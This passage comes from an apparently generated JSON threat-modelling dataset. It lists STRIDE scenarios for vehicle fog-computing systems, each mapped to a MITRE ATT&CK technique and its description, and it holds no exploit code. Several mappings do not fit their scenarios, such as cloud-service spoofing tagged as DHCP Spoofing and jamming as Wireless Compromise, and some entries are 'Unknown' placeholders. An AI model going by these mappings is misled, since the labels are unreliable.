                },
                {
                    "Assumption": "Fog nodes do not use mutual authentication during communication.",
                    "Role": "System Designer",
                    "Condition": "Authentication protocols are weak or absent."
                }
            ],
            "Potential Impact": "Altered traffic management decisions, leading to potential traffic congestion or accidents.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "fog node",
                "RSU",
                "network impersonation"
            ],
            "mitre_technique": {
                "name": "DHCP Spoofing",
                "description": "Adversaries may redirect network traffic to adversary-owned systems by spoofing Dynamic Host Configuration Protocol (DHCP) traffic and acting as a malicious DHCP server on the victim network. By achieving the adversary-in-the-middle (AiTM) position, adversaries may collect network communications, including passed credentials, especially those sent over insecure, unencrypted protocols. This may also enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).\n\nDHCP is based on a client-server model and has two functionalities: a protocol for providing network configuration settings from a DHCP server to a client and a mechanism for allocating network addresses to clients.(Citation: rfc2131) The typical server-client interaction is as follows: \n\n1. The client broadcasts a `DISCOVER` message.\n\n2. The server responds with an `OFFER` message, which includes an available network address. \n\n3. The client broadcasts a `REQUEST` message, which includes the network address offered. \n\n4. The server acknowledges with an `ACK` message and the client receives the network configuration parameters.\n\nAdversaries may spoof as a rogue DHCP server on the victim network, from which legitimate hosts may receive malicious network configurations. For example, malware can act as a DHCP server and provide adversary-owned DNS servers to the victimized computers.(Citation: new_rogue_DHCP_serv_malware)(Citation: w32.tidserv.g) Through the malicious network configurations, an adversary may achieve the AiTM position, route client traffic through adversary-controlled systems, and collect information from the client network.\n\nDHCPv6 clients can receive network configuration information without being assigned an IP address by sending a <code>INFORMATION-REQUEST (code 11)</code> message to the <code>All_DHCP_Relay_Agents_and_Servers</code> multicast address.(Citation: rfc3315) Adversaries may use their rogue DHCP server to respond to this request message with malicious network configurations.\n\nRather than establishing an AiTM position, adversaries may also abuse DHCP spoofing to perform a DHCP exhaustion attack (i.e, [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002)) by generating many broadcast DISCOVER messages to exhaust a network\u2019s DHCP allocation pool. ",
                "id": "attack-pattern--59ff91cd-1430-4075-8563-e6f15f4f9ff5",
                "technique_id": "T1557.003"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs cloud services to steal sensitive vehicular data.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can intercept or mimic cloud service endpoints.",
                    "Role": "Attacker",
                    "Condition": "Network security controls are inadequate."
                },
                {
                    "Assumption": "Cloud services do not use encrypted communication with fog nodes.",
                    "Role": "System Designer",
                    "Condition": "Encryption is weak or absent."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data, leading to potential data breaches.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "cloud service",
                "data breach",
                "network interception"
            ],
            "mitre_technique": {
                "name": "DHCP Spoofing",
                "description": "Adversaries may redirect network traffic to adversary-owned systems by spoofing Dynamic Host Configuration Protocol (DHCP) traffic and acting as a malicious DHCP server on the victim network. By achieving the adversary-in-the-middle (AiTM) position, adversaries may collect network communications, including passed credentials, especially those sent over insecure, unencrypted protocols. This may also enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).\n\nDHCP is based on a client-server model and has two functionalities: a protocol for providing network configuration settings from a DHCP server to a client and a mechanism for allocating network addresses to clients.(Citation: rfc2131) The typical server-client interaction is as follows: \n\n1. The client broadcasts a `DISCOVER` message.\n\n2. The server responds with an `OFFER` message, which includes an available network address. \n\n3. The client broadcasts a `REQUEST` message, which includes the network address offered. \n\n4. The server acknowledges with an `ACK` message and the client receives the network configuration parameters.\n\nAdversaries may spoof as a rogue DHCP server on the victim network, from which legitimate hosts may receive malicious network configurations. For example, malware can act as a DHCP server and provide adversary-owned DNS servers to the victimized computers.(Citation: new_rogue_DHCP_serv_malware)(Citation: w32.tidserv.g) Through the malicious network configurations, an adversary may achieve the AiTM position, route client traffic through adversary-controlled systems, and collect information from the client network.\n\nDHCPv6 clients can receive network configuration information without being assigned an IP address by sending a <code>INFORMATION-REQUEST (code 11)</code> message to the <code>All_DHCP_Relay_Agents_and_Servers</code> multicast address.(Citation: rfc3315) Adversaries may use their rogue DHCP server to respond to this request message with malicious network configurations.\n\nRather than establishing an AiTM position, adversaries may also abuse DHCP spoofing to perform a DHCP exhaustion attack (i.e, [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002)) by generating many broadcast DISCOVER messages to exhaust a network\u2019s DHCP allocation pool. ",
                "id": "attack-pattern--59ff91cd-1430-4075-8563-e6f15f4f9ff5",
                "technique_id": "T1557.003"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies data transmitted between vehicles and fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "The transmission medium between vehicles and fog nodes is insecure.",
                    "Role": "Attacker",
                    "Condition": "Transmission medium is susceptible to interception."
                },
                {
                    "Assumption": "Data integrity checks are not implemented or are weak.",
                    "Role": "System Designer",
                    "Condition": "Lack of robust integrity checks."
                }
            ],
            "Potential Impact": "Data corruption and misleading information being used for traffic management.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data integrity",
                "network",
                "man-in-the-middle"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies firmware on fog nodes to manipulate traffic data.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can physically access fog nodes.",
                    "Role": "Attacker",
                    "Condition": "Physical security around fog nodes is weak."
                },
                {
                    "Assumption": "Firmware lacks adequate tamper resistance or detection mechanisms.",
                    "Role": "System Designer",
                    "Condition": "Firmware is not adequately protected."
                }
            ],
            "Potential Impact": "Corrupted traffic data leading to dangerous traffic situations.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "firmware",
                "fog node",
                "physical access"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker tampers with data stored in the cloud to provide incorrect analytics.",
            "Assumptions": [
                {
                    "Assumption": "The attacker gains access to cloud storage services.",
                    "Role": "Attacker",
                    "Condition": "Cloud storage access controls are weak."
                },
                {
                    "Assumption": "Data verification mechanisms are not in place.",
                    "Role": "System Designer",
                    "Condition": "Verification mechanisms are absent."
                }
            ],
            "Potential Impact": "Misleading analytics resulting in flawed predictive maintenance and traffic optimization.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "cloud storage",
                "data integrity",
                "analytics manipulation"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker denies having altered vehicle data used for traffic management.",
            "Assumptions": [
                {
                    "Assumption": "System lacks data provenance mechanisms.",
                    "Role": "System Designer",
                    "Condition": "Provenance tracking is inadequate or absent."
                },
                {
                    "Assumption": "Logs are either not generated or are easily modifiable.",
                    "Role": "System Administrator",
                    "Condition": "Log integrity is weak."
                }
            ],
            "Potential Impact": "Difficulty in holding attackers accountable and in timely incident response.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "vehicle data",
                "traffic management",
                "log manipulation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker claims that malicious commands issued to fog nodes did not originate from them.",
            "Assumptions": [
                {
                    "Assumption": "The communication channels do not include non-repudiation mechanisms.",
                    "Role": "System Designer",
                    "Condition": "Non-repudiation is not enforced."
                },
                {
                    "Assumption": "Command logs are not properly secured or are absent.",
                    "Role": "System Administrator",
                    "Condition": "Log management is inadequate."
                }
            ],
            "Potential Impact": "Challenges in incident investigation and forensics.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "fog node commands",
                "non-repudiation",
                "log security"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker modifies traffic data but claims to have no involvement.",
            "Assumptions": [
                {
                    "Assumption": "Logs are either not present or not protected against tampering.",
                    "Role": "System Administrator",
                    "Condition": "Logging mechanism is weak."
                },
                {
                    "Assumption": "Data changes are not monitored or logged.",
                    "Role": "System Designer",
                    "Condition": "No monitoring of data integrity."
                }
            ],
            "Potential Impact": "Compromised system trust and inability to attribute actions to specific actors.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "traffic data",
                "data tampering",
                "log modification"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts unencrypted data flows between vehicles and fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "The communication channel between vehicles and fog nodes is unencrypted.",
                    "Role": "System Designer",
                    "Condition": "Encryption is not applied or is weak."
                },
                {
                    "Assumption": "The attacker has access to network transmission points.",
                    "Role": "Attacker",
                    "Condition": "Network security controls are inadequate."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive information leading to privacy breaches.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "network",
                "unsecure communication",
                "data interception"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker gains unauthorized access to fog node storage to retrieve sensitive data.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes store sensitive data locally.",
                    "Role": "System Designer",
                    "Condition": "Data protection mechanisms are not robust."
                },
                {
                    "Assumption": "Access controls on fog nodes are weak or absent.",
                    "Role": "System Administrator",
                    "Condition": "Access control policies are weak."
                }
            ],
            "Potential Impact": "Exposure of sensitive vehicle and traffic data.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "fog node",
                "data storage",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Exploitation of Remote Services",
                "description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",
                "id": "attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82",
                "technique_id": "T1210"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker eavesdrops on data flows between fog nodes and cloud services.",
            "Assumptions": [
                {
                    "Assumption": "Data flows between fog nodes and cloud services are not encrypted.",
                    "Role": "System Designer",
                    "Condition": "Encryption is not applied or is weak."
                },
                {
                    "Assumption": "The attacker has access to intermediate network paths.",
                    "Role": "Attacker",
                    "Condition": "Network paths are unsecured."
                }
            ],
            "Potential Impact": "Leakage of high-value data processed for analytics and storage.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "cloud services",
                "eavesdropping",
                "data flow"
            ],
            "mitre_technique": {
                "name": "Cloud Services",
                "description": "Adversaries may log into accessible cloud services within a compromised environment using [Valid Accounts](https://attack.mitre.org/techniques/T1078) that are synchronized with or federated to on-premises user identities. The adversary may then perform management actions or access cloud-hosted resources as the logged-on user. \n\nMany enterprises federate centrally managed user identities to cloud services, allowing users to login with their domain credentials in order to access the cloud control plane. Similarly, adversaries may connect to available cloud services through the web console or through the cloud command line interface (CLI) (e.g., [Cloud API](https://attack.mitre.org/techniques/T1059/009)), using commands such as <code>Connect-AZAccount</code> for Azure PowerShell, <code>Connect-MgGraph</code> for Microsoft Graph PowerShell, and <code>gcloud auth login</code> for the Google Cloud CLI.\n\nIn some cases, adversaries may be able to authenticate to these services via [Application Access Token](https://attack.mitre.org/techniques/T1550/001) instead of a username and password. ",
                "id": "attack-pattern--8861073d-d1b8-4941-82ce-dce621d398f0",
                "technique_id": "T1021.007"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods fog nodes with excessive data causing them to become unresponsive.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes have finite processing and storage resources.",
                    "Role": "System Designer",
                    "Condition": "Resource limits are not protected."
                },
                {
                    "Assumption": "The network lacks mechanisms to detect and mitigate flood attacks.",
                    "Role": "System Administrator",
                    "Condition": "Flood attack mitigations are weak."
                }
            ],
            "Potential Impact": "Disruption to real-time traffic management and vehicle data processing.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "fog node",
                "data flood",
                "resource exhaustion"
            ],
            "mitre_technique": {
                "name": "OS Exhaustion Flood",
                "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
                "id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
                "technique_id": "T1499.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker targets centralized cloud services with a DoS attack to disrupt VFC operations.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services are accessible over the internet.",
                    "Role": "System Designer",
                    "Condition": "Cloud services are publicly accessible."
                },
                {
                    "Assumption": "DoS protection mechanisms in the cloud are not robust.",
                    "Role": "Cloud Provider",
                    "Condition": "DoS protection is insufficient."
                }
            ],
            "Potential Impact": "Unavailability of cloud services affecting long-term data storage and analytics.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "cloud service",
                "DoS attack",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker jams communication channels between vehicles and fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "Vehicles and fog nodes use wireless communication susceptible to jamming.",
                    "Role": "System Designer",
                    "Condition": "Wireless channels are vulnerable."
                },
                {
                    "Assumption": "No redundancy or failsafe communication paths are in place.",
                    "Role": "System Administrator",
                    "Condition": "Single point of failure in communication."
                }
            ],
            "Potential Impact": "Interruption of data flow leading to loss of real-time processing capabilities.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "wireless communication",
                "jamming",
                "data flow disruption"
            ],
            "mitre_technique": {
                "name": "Wireless Compromise",
                "description": "Adversaries may perform wireless compromise as a method of gaining communications and unauthorized access to a wireless network. Access to a wireless network may be gained through the compromise of a wireless device. (Citation: Alexander Bolshev, Gleb Cherbov July 2014) (Citation: Alexander Bolshev March 2014) Adversaries may also utilize radios and other wireless communication devices on the same frequency as the wireless network. Wireless compromise can be done as an initial access vector from a remote distance. \n\nA Polish student used a modified TV remote controller to gain access to and control over the Lodz city tram system in Poland. (Citation: John Bill May 2017) (Citation: Shelley Smith February 2008) The remote controller device allowed the student to interface with the trams network to modify track settings and override operator control. The adversary may have accomplished this by aligning the controller to the frequency and amplitude of IR control protocol signals. (Citation: Bruce Schneier January 2008) The controller then enabled initial access to the network, allowing the capture and replay of tram signals. (Citation: John Bill May 2017)",
                "id": "attack-pattern--2877063e-1851-48d2-bcc6-bc1d2733157e",
                "technique_id": "T0860"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the fog node firmware to gain higher-level access.",
            "Assumptions": [
                {
                    "Assumption": "Fog node firmware has vulnerabilities that can be exploited.",
                    "Role": "System Designer",
                    "Condition": "Vulnerabilities are unpatched."
                },
                {
                    "Assumption": "The attacker can successfully exploit these vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Successful exploitation path exists."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data and control over fog node operations.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "fog node",
                "vulnerability exploitation",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Exploitation for Credential Access",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0\n\nCredentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain authenticated access to systems. One example of this is `MS14-068`, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions.(Citation: Technet MS14-068)(Citation: ADSecurity Detecting Forged Tickets) Another example of this is replay attacks, in which the adversary intercepts data packets sent between parties and then later replays these packets. If services don't properly validate authentication requests, these replayed packets may allow an adversary to impersonate one of the parties and gain unauthorized access or privileges.(Citation: Bugcrowd Replay Attack)(Citation: Comparitech Replay Attack)(Citation: Microsoft Midnight Blizzard Replay Attack)\n\nSuch exploitation has been demonstrated in cloud environments as well. For example, adversaries have exploited vulnerabilities in public cloud infrastructure that allowed for unintended authentication token creation and renewal.(Citation: Storm-0558 techniques for unauthorized email access)\n\nExploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained.",
                "id": "attack-pattern--9c306d8d-cde7-4b4c-b6e8-d0bb16caca36",
                "technique_id": "T1212"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker leverages a cloud misconfiguration to gain administrative access to cloud services.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services have misconfigurations that allow privilege escalation.",
                    "Role": "Cloud Administrator",
                    "Condition": "Misconfigurations are present."
                },
                {
                    "Assumption": "The attacker can identify and exploit these misconfigurations.",
                    "Role": "Attacker",
                    "Condition": "Misconfiguration exploitation path exists."
                }
            ],
            "Potential Impact": "Full control over cloud services leading to extensive data breaches and service manipulation.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "cloud services",
                "misconfiguration exploitation",
                "administrative access"
            ],
            "mitre_technique": {
                "name": "Cloud API",
                "description": "Adversaries may abuse cloud APIs to execute malicious commands. APIs available in cloud environments provide various functionalities and are a feature-rich method for programmatic access to nearly all aspects of a tenant. These APIs may be utilized through various methods such as command line interpreters (CLIs), in-browser Cloud Shells, [PowerShell](https://attack.mitre.org/techniques/T1059/001) modules like Azure for PowerShell(Citation: Microsoft - Azure PowerShell), or software developer kits (SDKs) available for languages such as [Python](https://attack.mitre.org/techniques/T1059/006).  \n\nCloud API functionality may allow for administrative access across all major services in a tenant such as compute, storage, identity and access management (IAM), networking, and security policies.\n\nWith proper permissions (often via use of credentials such as [Application Access Token](https://attack.mitre.org/techniques/T1550/001) and [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004)), adversaries may abuse cloud APIs to invoke various functions that execute malicious actions. For example, CLI and PowerShell functionality may be accessed through binaries installed on cloud-hosted or on-premises hosts or accessed through a browser-based cloud shell offered by many cloud platforms (such as AWS, Azure, and GCP). These cloud shells are often a packaged unified environment to use CLI and/or scripting modules hosted as a container in the cloud environment.  ",
                "id": "attack-pattern--55bb4471-ff1f-43b4-88c1-c9384ec47abf",
                "technique_id": "T1059.009"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker escalates privileges on a smart vehicle to gain control over its communication with fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "The vehicle's software/firmware contains exploitable vulnerabilities.",
                    "Role": "Vehicle Manufacturer",
                    "Condition": "Vulnerabilities are present."
                },
                {
                    "Assumption": "The attacker has necessary tools and knowledge to exploit these vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Knowledge and tools available."
                }
            ],
            "Potential Impact": "Manipulated data flows and unauthorized commands sent to the VFC system.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "smart vehicle",
                "vulnerability exploitation",
                "command manipulation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        }
    ]
},
{
    "case_number": "11",
    "batch_number": "29",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs a vehicle's identity to send false data to fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the communication protocol between vehicles and fog nodes.",
                    "Role": "Attacker",
                    "Condition": "Communication protocols are accessible and insufficiently secured."
                },
                {
                    "Assumption": "The fog nodes do not have strong authentication mechanisms.",
                    "Role": "System Designer",
                    "Condition": "Authentication mechanisms are either weak or not implemented."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information, corruption of data, and system disruption.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "device",
                "identity"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
